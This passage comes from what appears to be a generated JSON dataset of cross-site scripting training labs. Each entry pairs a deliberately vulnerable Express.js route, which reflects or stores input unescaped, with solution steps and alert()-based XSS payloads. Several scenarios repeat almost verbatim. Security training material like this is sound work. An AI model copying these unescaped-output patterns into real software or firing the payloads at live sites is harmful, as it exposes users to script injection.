        "payloads": [
            "<script>alert('Reset')</script>",
            "<img src=x onerror=alert('Reset')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in event registration comments",
        "Lab Description": "Users can leave comments on event registrations, which are stored and displayed unsanitized. To solve: Inject a persistent XSS payload.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Register for event with comment <script>alert('Event')</script>.",
            "Reload event details to trigger execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/register-event', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO event_comments (comment) VALUES (?)\", [comment]);\n  res.send('Registered');\n});",
        "payloads": [
            "<script>alert('Event')</script>",
            "<img src=x onerror=alert('Event')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in contact us form",
        "Lab Description": "The contact form reflects user message into response without encoding. To solve: Inject a script via message field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit contact form with message: <script>alert('Contact')</script>.",
            "Observe execution on the confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/contact-us', (req, res) => {\n  const message = req.body.message;\n  res.send(`<p>Message received: ${message}</p>`);\n});",
        "payloads": [
            "<script>alert('Contact')</script>",
            "<img src=x onerror=alert('Contact')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online shop product reviews",
        "Lab Description": "Product reviews are displayed without sanitization, leading to stored XSS. To solve: Submit malicious review payloads.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a review: <script>alert('Shop')</script>.",
            "Reload product page to trigger payload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO reviews (review) VALUES (?)\", [review]);\n  res.redirect('/products');\n});",
        "payloads": [
            "<script>alert('Shop')</script>",
            "<svg/onload=alert('ReviewXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in newsletter signup",
        "Lab Description": "Newsletter signup reflects submitted name into response page unsanitized. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit name: <script>alert('Newsletter')</script>.",
            "Observe execution on thank you page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/newsletter-signup', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Thanks for signing up, ${name}!</p>`);\n});",
        "payloads": [
            "<script>alert('Newsletter')</script>",
            "<img src=x onerror=alert('NewsletterXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in public forum thread replies",
        "Lab Description": "Forum replies are saved and displayed without escaping, allowing stored XSS attacks. To solve: Inject XSS via reply field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a forum reply: <script>alert('Forum')</script>.",
            "View the thread and observe payload execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/reply-thread', (req, res) => {\n  const reply = req.body.reply;\n  db.query(\"INSERT INTO forum_replies (reply) VALUES (?)\", [reply]);\n  res.redirect('/forum');\n});",
        "payloads": [
            "<script>alert('Forum')</script>",
            "<svg/onload=alert('ForumXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in internal notes section",
        "Lab Description": "An internal CRM system allows adding notes to customer profiles. These notes are rendered without sanitization. To solve: Inject a persistent XSS payload in a note field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a note containing <script>alert('Note')</script>.",
            "Reload the customer profile page to observe execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO notes (content) VALUES (?)\", [note]);\n  res.send('Note added');\n});",
        "payloads": [
            "<script>alert('Note')</script>",
            "<img src=x onerror=alert('NoteXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in job application form",
        "Lab Description": "The job application form reflects user-submitted name into the success page without encoding. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit the application with name <script>alert('Job')</script>.",
            "Observe script execution on the confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply-job', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h1>Application received, ${name}</h1>`);\n});",
        "payloads": [
            "<script>alert('Job')</script>",
            "<img src=x onerror=alert('JobXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in blog post comment section",
        "Lab Description": "Comments on blog posts are stored and displayed without proper sanitization, leading to stored XSS. To solve: Submit a malicious comment.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Post a comment: <script>alert('Comment')</script>.",
            "Reload blog post and observe execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/post-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO comments (text) VALUES (?)\", [comment]);\n  res.redirect('/blog');\n});",
        "payloads": [
            "<script>alert('Comment')</script>",
            "<svg/onload=alert('CommentXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in newsletter unsubscribe page",
        "Lab Description": "When unsubscribing from the newsletter, the email field is reflected in the response without escaping, leading to reflected XSS. To solve: Inject a script via email field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit email <script>alert('Unsub')</script> on unsubscribe page.",
            "Observe execution on the response page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/unsubscribe', (req, res) => {\n  const email = req.body.email;\n  res.send(`<p>Unsubscribed: ${email}</p>`);\n});",
        "payloads": [
            "<script>alert('Unsub')</script>",
            "<img src=x onerror=alert('UnsubscribeXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in portfolio project descriptions",
        "Lab Description": "Users can create portfolios by adding project descriptions. These descriptions are rendered without validation. To solve: Inject a stored XSS payload.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Create a portfolio project with <script>alert('Portfolio')</script>.",
            "Reload portfolio to trigger execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-project', (req, res) => {\n  const description = req.body.description;\n  db.query(\"INSERT INTO projects (description) VALUES (?)\", [description]);\n  res.send('Project added');\n});",
        "payloads": [
            "<script>alert('Portfolio')</script>",
            "<img src=x onerror=alert('PortfolioXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in event registration confirmation",
        "Lab Description": "When registering for events, user input is reflected into the confirmation page without escaping. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Register for event with name: <script>alert('Event')</script>.",
            "Observe script execution after registration."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/register', (req, res) => {\n  const attendee = req.body.attendee;\n  res.send(`<h2>Thanks for registering, ${attendee}</h2>`);\n});",
        "payloads": [
            "<script>alert('Event')</script>",
            "<svg/onload=alert('EventXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in FAQ question submission",
        "Lab Description": "Users can submit questions for the FAQ section, but input is saved and rendered without validation. To solve: Inject stored XSS via question field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a question <script>alert('FAQ')</script>.",
            "View FAQ page and observe execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-faq', (req, res) => {\n  const question = req.body.question;\n  db.query(\"INSERT INTO faqs (question) VALUES (?)\", [question]);\n  res.redirect('/faq');\n});",
        "payloads": [
            "<script>alert('FAQ')</script>",
            "<img src=x onerror=alert('FAQXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in site feedback form",
        "Lab Description": "Feedback form reflects submitted text into a confirmation page unsanitized. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit feedback: <script>alert('Feedback')</script>.",
            "Observe execution on the confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  res.send(`<p>Your feedback: ${feedback}</p>`);\n});",
        "payloads": [
            "<script>alert('Feedback')</script>",
            "<svg/onload=alert('FeedbackXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in bug report description",
        "Lab Description": "Bug report descriptions are stored and rendered without escaping, leading to stored XSS vulnerabilities. To solve: Inject a script via bug description field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Report a bug with description <script>alert('Bug')</script>.",
            "Reload admin bug review page to trigger payload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/report-bug', (req, res) => {\n  const description = req.body.description;\n  db.query(\"INSERT INTO bugs (description) VALUES (?)\", [description]);\n  res.send('Bug reported');\n});",
        "payloads": [
            "<script>alert('Bug')</script>",
            "<img src=x onerror=alert('BugXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in login error message",
        "Lab Description": "Incorrect login attempts reflect user input into an error message unsanitized, enabling reflected XSS. To solve: Inject a script via username field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Attempt login with username <script>alert('Login')</script>.",
            "Observe error page executing the payload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  res.send(`<p>Login failed for ${username}</p>`);\n});",
        "payloads": [
            "<script>alert('Login')</script>",
            "<svg/onload=alert('LoginXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in user profile status message",
        "Lab Description": "Users can set a status message on their profile, but the input is stored and rendered without sanitization, allowing stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Set status message to <script>alert('StatusXSS')</script>.",
            "Reload the profile page and observe script execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-status', (req, res) => {\n  const status = req.body.status;\n  db.query(\"UPDATE users SET status = ? WHERE id = ?\", [status, req.user.id]);\n  res.send('Status updated');\n});",
        "payloads": [
            "<script>alert('StatusXSS')</script>",
            "<img src=x onerror=alert('Status')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in password reset form",
        "Lab Description": "The password reset page reflects the email address back into the page without proper escaping, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit email <script>alert('ResetXSS')</script>.",
            "Observe payload execution on the reset confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/reset-password', (req, res) => {\n  const email = req.body.email;\n  res.send(`<p>Password reset link sent to: ${email}</p>`);\n});",
        "payloads": [
            "<script>alert('ResetXSS')</script>",
            "<svg/onload=alert('Reset')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in customer feedback form",
        "Lab Description": "Feedback submitted through the customer feedback form is stored in the database and displayed without escaping, leading to stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit feedback <script>alert('FeedbackXSS')</script>.",
            "Check the admin panel where feedback is listed."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  db.query(\"INSERT INTO feedbacks (content) VALUES (?)\", [feedback]);\n  res.send('Feedback submitted');\n});",
        "payloads": [
            "<script>alert('FeedbackXSS')</script>",
            "<img src=x onerror=alert('FeedbackXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in report abuse form",
        "Lab Description": "User-submitted report messages are reflected back without sanitization, enabling reflected XSS attacks.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit abuse report with message <script>alert('Abuse')</script>.",
            "Observe execution on the confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/report-abuse', (req, res) => {\n  const message = req.body.message;\n  res.send(`<div>Report submitted: ${message}</div>`);\n});",
        "payloads": [
            "<script>alert('Abuse')</script>",
            "<svg/onload=alert('Abuse')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in conference submission abstracts",
        "Lab Description": "Abstracts submitted for a conference are stored and displayed without sanitization, leading to persistent XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit an abstract containing <script>alert('Conference')</script>.",
            "View abstract listing to trigger XSS."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-abstract', (req, res) => {\n  const abstract = req.body.abstract;\n  db.query(\"INSERT INTO abstracts (content) VALUES (?)\", [abstract]);\n  res.send('Abstract submitted');\n});",
        "payloads": [
            "<script>alert('Conference')</script>",
            "<img src=x onerror=alert('ConfXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online booking system",
        "Lab Description": "The booking confirmation page reflects user-submitted input without escaping, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Book with a name: <script>alert('Booking')</script>.",
            "Observe script execution in the confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/confirm-booking', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h3>Booking confirmed for: ${name}</h3>`);\n});",
        "payloads": [
            "<script>alert('Booking')</script>",
            "<svg/onload=alert('BookingXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in product question and answer section",
        "Lab Description": "Users can submit questions on product pages, but these are displayed unsanitized, leading to stored XSS vulnerabilities.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a question: <script>alert('ProductQA')</script>.",
            "Reload product page and observe payload execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/ask-question', (req, res) => {\n  const question = req.body.question;\n  db.query(\"INSERT INTO questions (content) VALUES (?)\", [question]);\n  res.send('Question submitted');\n});",
        "payloads": [
            "<script>alert('ProductQA')</script>",
            "<img src=x onerror=alert('QuestionXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in contact us form",
        "Lab Description": "The contact us form reflects the name field back in the response page without sanitization, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit name: <script>alert('Contact')</script>.",
            "Observe execution on the thank you page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/contact', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Thanks for contacting us, ${name}</p>`);\n});",
        "payloads": [
            "<script>alert('Contact')</script>",
            "<svg/onload=alert('ContactXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in support ticket messages",
        "Lab Description": "Support ticket messages are stored unsanitized and displayed to admins, leading to stored XSS vulnerabilities.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a ticket message: <script>alert('SupportTicket')</script>.",
            "Login as admin and view the ticket."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-ticket', (req, res) => {\n  const message = req.body.message;\n  db.query(\"INSERT INTO tickets (message) VALUES (?)\", [message]);\n  res.send('Ticket submitted');\n});",
        "payloads": [
            "<script>alert('SupportTicket')</script>",
            "<img src=x onerror=alert('SupportXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in feedback preview page",
        "Lab Description": "The feedback preview page reflects the feedback text input without proper encoding, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit feedback <script>alert('Preview')</script>.",
            "Observe immediate payload execution in the preview."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/preview-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  res.send(`<div>Preview: ${feedback}</div>`);\n});",
        "payloads": [
            "<script>alert('Preview')</script>",
            "<svg/onload=alert('PreviewXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in event management platform guest notes",
        "Lab Description": "Guests can leave notes when registering for events. The notes are rendered without sanitization, leading to stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a note with <script>alert('EventGuest')</script>.",
            "View the event dashboard and trigger XSS."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/register-event', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO guests (note) VALUES (?)\", [note]);\n  res.send('Registration complete');\n});",
        "payloads": [
            "<script>alert('EventGuest')</script>",
            "<img src=x onerror=alert('EventNote')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in product return form",
        "Lab Description": "The return request form reflects user comments directly into the page without sanitization, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit a comment with <script>alert('ReturnXSS')</script>.",
            "Observe script execution in return confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-return', (req, res) => {\n  const comment = req.body.comment;\n  res.send(`<div>Return comment: ${comment}</div>`);\n});",
        "payloads": [
            "<script>alert('ReturnXSS')</script>",
            "<svg/onload=alert('Return')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online newspaper comment section",
        "Lab Description": "Reader comments on articles are stored unsanitized, leading to persistent XSS vulnerabilities.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Post a comment: <script>alert('NewsXSS')</script>.",
            "View the article page to trigger payload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/post-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO comments (text) VALUES (?)\", [comment]);\n  res.send('Comment posted');\n});",
        "payloads": [
            "<script>alert('NewsXSS')</script>",
            "<img src=x onerror=alert('CommentXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in support live chat pre-form",
        "Lab Description": "The support chat pre-form echoes back the name field without sanitization, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Enter name <script>alert('ChatXSS')</script> into chat pre-form.",
            "See execution on welcome page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/chat-start', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Welcome ${name}</p>`);\n});",
        "payloads": [
            "<script>alert('ChatXSS')</script>",
            "<svg/onload=alert('ChatWelcome')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in e-commerce wishlist notes",
        "Lab Description": "Users can add notes to wishlist items. These notes are stored without validation, allowing stored XSS attacks.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Add note <script>alert('Wishlist')</script>.",
            "View wishlist page and observe execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-wishlist-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"UPDATE wishlist SET note = ? WHERE user_id = ?\", [note, req.user.id]);\n  res.send('Note added to wishlist');\n});",
        "payloads": [
            "<script>alert('Wishlist')</script>",
            "<img src=x onerror=alert('WishlistXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in job application portal cover letter",
        "Lab Description": "The job application form reflects cover letters without sanitization during preview, causing reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Paste <script>alert('CoverXSS')</script> into cover letter.",
            "Observe payload execution during preview."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/preview-cover', (req, res) => {\n  const coverLetter = req.body.cover;\n  res.send(`<div>Cover Letter Preview: ${coverLetter}</div>`);\n});",
        "payloads": [
            "<script>alert('CoverXSS')</script>",
            "<svg/onload=alert('Cover')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in university course review system",
        "Lab Description": "Students submit course reviews, but reviews are stored without sanitization, enabling stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit course review: <script>alert('CourseXSS')</script>.",
            "View course page and observe the execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO course_reviews (content) VALUES (?)\", [review]);\n  res.send('Review submitted');\n});",
        "payloads": [
            "<script>alert('CourseXSS')</script>",
            "<img src=x onerror=alert('ReviewXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in event RSVP form",
        "Lab Description": "The RSVP form for events reflects user name without encoding, leading to reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit RSVP with name: <script>alert('RSVPXSS')</script>.",
            "Check if the page renders and executes the payload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/rsvp', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h3>RSVP received for ${name}</h3>`);\n});",
        "payloads": [
            "<script>alert('RSVPXSS')</script>",
            "<svg/onload=alert('RSVPXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in car rental system customer comments",
        "Lab Description": "Customers can leave comments about rentals. The input is stored without sanitization, allowing XSS attacks.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit comment <script>alert('CarRental')</script>.",
            "Check rental details page and observe execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO rental_comments (comment) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
        "payloads": [
            "<script>alert('CarRental')</script>",
            "<img src=x onerror=alert('RentalXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in file upload metadata field",
        "Lab Description": "The file uploader accepts a description field that is reflected without escaping, enabling reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Upload file with description: <script>alert('UploadXSS')</script>.",
            "Observe script execution in upload confirmation."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/upload-file', (req, res) => {\n  const description = req.body.description;\n  res.send(`<p>File description: ${description}</p>`);\n});",
        "payloads": [
            "<script>alert('UploadXSS')</script>",
            "<svg/onload=alert('UploadXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in real estate portal property notes",
        "Lab Description": "Real estate users can add private notes to property listings. These notes are stored without sanitization, allowing persistent XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Add a private note: <script>alert('RealEstateXSS')</script>.",
            "View the property dashboard and trigger XSS."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-property-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO property_notes (note) VALUES (?)\", [note]);\n  res.send('Note added');\n});",
        "payloads": [
            "<script>alert('RealEstateXSS')</script>",
            "<img src=x onerror=alert('PropertyNote')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in password reset form",
        "Lab Description": "The password reset form reflects the email input without sanitization, enabling reflected XSS attacks.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit email: <script>alert('ResetXSS')</script>.",
            "Observe execution on password reset confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/reset-password', (req, res) => {\n  const email = req.body.email;\n  res.send(`<p>Password reset link sent to: ${email}</p>`);\n});",
        "payloads": [
            "<script>alert('ResetXSS')</script>",
            "<svg/onload=alert('Reset')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in project collaboration tool task updates",
        "Lab Description": "Users can post updates to shared tasks, but the input is stored without validation, causing stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Post a task update with <script>alert('TaskUpdate')</script>.",
            "View the project board and trigger the script."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-task', (req, res) => {\n  const update = req.body.update;\n  db.query(\"INSERT INTO task_updates (update_text) VALUES (?)\", [update]);\n  res.send('Task update posted');\n});",
        "payloads": [
            "<script>alert('TaskUpdate')</script>",
            "<img src=x onerror=alert('TaskXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in discount coupon generator",
        "Lab Description": "The discount code generation page reflects input data without sanitization, causing reflected XSS.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Enter coupon name: <script>alert('CouponXSS')</script>.",
            "Observe payload execution in the generated coupon page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/generate-coupon', (req, res) => {\n  const coupon = req.body.coupon;\n  res.send(`<div>Your Coupon: ${coupon}</div>`);\n});",
        "payloads": [
            "<script>alert('CouponXSS')</script>",
            "<svg/onload=alert('Coupon')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in book review platform",
        "Lab Description": "Readers submit reviews for books without input sanitization, allowing stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a book review: <script>alert('BookReviewXSS')</script>.",
            "Reload the book page and trigger payload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-book-review', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO book_reviews (content) VALUES (?)\", [review]);\n  res.send('Review posted');\n});",
        "payloads": [
            "<script>alert('BookReviewXSS')</script>",
            "<img src=x onerror=alert('BookXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in subscription confirmation page",
        "Lab Description": "The subscription form reflects the user's email on the confirmation page without sanitization, causing reflected XSS.",
